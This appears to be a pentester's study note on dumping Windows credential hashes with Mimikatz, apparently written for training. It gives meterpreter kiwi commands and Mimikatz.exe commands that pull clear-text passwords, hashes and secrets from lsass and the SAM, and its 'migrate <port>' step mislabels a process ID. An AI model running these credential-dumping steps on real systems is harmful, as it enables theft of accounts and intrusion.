---
up: "[[Windows Credential Dumping]]"
tools:
  - "[[mimikatz]]"
---

# Dumping Hashes with Mimikatz

- Mimikatz: Windows post-exploitation tool
- Allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory
- Used to extract hashes from the `lsass.exe` process memory where hashes are cached
- We can run the pre-compiled mimikatz executable or from a meterpreter session use the kiwi extension
- Admin privileges are required to run properly

## Demonstration

### Kiwi extension

```bash
> pgrep lsass
> migrate <port>
```

```bash
> load kiwi
# help menu
> ?
> creds_all
> lsa_dump_sam
> lsa_dump_secrets
```

In a real pentest don't change a user's password.

### Mimikatz.exe

```bash
> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
> shell
>.\mimikatz.exe
# privilege::debug
'20' OK
# lsadump::sam
# lsadump::secrets
# sekurlsa::logonpasswords
```
